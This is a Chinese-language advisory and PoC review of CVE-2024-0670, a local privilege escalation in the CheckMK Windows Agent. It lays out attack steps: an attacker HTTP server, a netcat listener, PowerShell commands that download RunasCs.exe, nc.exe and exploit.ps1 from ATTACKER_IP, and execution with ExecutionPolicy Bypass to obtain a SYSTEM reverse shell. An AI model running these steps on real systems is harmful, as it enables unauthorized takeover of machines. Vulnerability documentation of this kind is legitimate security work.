## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (LPE)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (LPE)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高

**CVSS评分:** CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (7.8)

**影响版本:** Checkmk Agent < 2.2.0p25, < 2.3.0p12

**利用条件:** 低权限Windows用户访问, 启用PowerShell, 需下载攻击工具, 需要攻击者搭建HTTP服务器和Netcat监听

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2024-0670是CheckMK Windows Agent中的一个本地权限提升漏洞。该漏洞源于CheckMK Agent在执行MSI修复过程中，会从`C:\Windows\Temp\`目录执行文件。一个低权限的本地用户可以利用这一机制，在该目录下放置具有可预测名称的恶意文件，从而在MSI修复被触发时以NT AUTHORITY\SYSTEM权限执行任意代码。本POC旨在演示如何利用此漏洞获取SYSTEM权限。

**POC有效性分析:**
该POC针对CheckMK Windows Agent的本地权限提升漏洞，通过滥用MSI修复机制中不安全的临时文件执行路径来获得SYSTEM权限。POC提供了`RunasCs.exe`（一个支持明文密码的runas替代品，其C#源代码`RunasCs.cs`也一并提供，增加了透明度）、标准的`nc.exe`（Netcat）以及核心利用脚本`exploit.ps1`。利用流程清晰，首先在攻击者机器上设置HTTP服务器来托管这些工具，并启动Netcat监听器。随后，在受害Windows机器上，低权限用户将这些工具下载到`C:\Windows\Temp\`目录。最后，通过执行`exploit.ps1`来触发MSI修复，`exploit.ps1`会将恶意负载植入系统，最终获得SYSTEM权限的反向Shell。这种利用模式在Windows权限提升中非常常见且可靠，漏洞的性质和利用方式在SEC Consult的咨询报告中也得到了详细说明。整体而言，该POC具备高度的有效性和可操作性。

**利用步骤:**
1.  **攻击者准备:**
    *   在攻击者机器上，启动一个简单的HTTP服务器（例如，使用Python的`python3 -m http.server 8000`）来托管`RunasCs.exe`、`nc.exe`和`exploit.ps1`。确保这些文件位于HTTP服务器的根目录。
    *   启动Netcat监听器，以接收反向Shell：`nc -lvnp 1111`。
2.  **目标系统操作:**
    *   作为低权限Windows用户登录目标系统。
    *   使用PowerShell从攻击者HTTP服务器下载必要的工具到`C:\Windows\Temp\`目录：
        ```powershell
        Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
        Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
        Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"
        ```
    *   执行利用脚本以触发权限提升：
        ```powershell
        .\RunasCs.exe <username> "<password>" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
        ```
        注意：`<username>`和`<password>`是当前低权限用户的凭据。`exploit.ps1`将负责滥用MSI修复机制来提升权限。
3.  **结果验证:**
    *   如果利用成功，攻击者机器上的Netcat监听器将收到一个具有`NT AUTHORITY\SYSTEM`权限的反向Shell。

**投毒风险分析:**
该POC的投毒风险评估为10%，属于较低风险。主要原因和考量如下：
*   **代码透明度**: POC提供了`RunasCs.exe`的C#源代码(`RunasCs.cs`)，使得该工具的行为是可审计的，没有发现明显的恶意代码。`nc.exe`是一个广为人知的标准网络工具，通常被认为是安全研究和渗透测试的合法工具。虽然`exploit.ps1`的完整源代码未直接在输入数据中提供，但其功能在`README.md`中被清晰描述为执行本地权限提升并获取反向Shell，这是漏洞利用的预期行为，而非额外的、隐藏的恶意功能。
*   **外部依赖与供应链风险**: 该POC要求从攻击者控制的HTTP服务器下载文件。在受控的防御性测试环境中，这意味着你可以完全控制所下载文件的内容。然而，如果用户从非官方、非受信的渠道获取此POC，攻击者可能已经篡改了`RunasCs.exe`、`nc.exe`或`exploit.ps1`，植入后门、挖矿程序、勒索软件或其他恶意负载。这种供应链攻击是主要的外部风险来源，但并非POC代码本身固有的风险。
*   **无混淆和可疑行为**: 提供的C#源代码清晰易读，没有进行代码混淆。`README.md`中的说明也直观明了。POC的逻辑专注于漏洞利用，没有发现利用加密、自修改代码或试图规避安全产品检测的明显迹象（除了利用PowerShell的ExecutionPolicy Bypass，这是合法PowerShell利用的常见做法）。
*   **法律免责声明**: POC的`README.md`明确指出该项目仅用于教育和授权的渗透测试，并警告不要用于非法目的，作者不对滥用负责。这表明作者的意图是合法的安全研究。

**总结**: 尽管POC利用远程下载文件，这引入了从不可信源获取时潜在的供应链风险，但就其提供的源代码和文档而言，该POC本身被认为是相对清洁和透明的。其核心功能是实现权限提升，这是合法的漏洞演示目的。因此，除非从不可信渠道获取被篡改的版本，否则该POC本身的投毒风险较低。

**项目地址:** https://github.com/SEC-CONSULT/CVE-2024-0670_CheckMK_LPE

**漏洞详情:** https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/
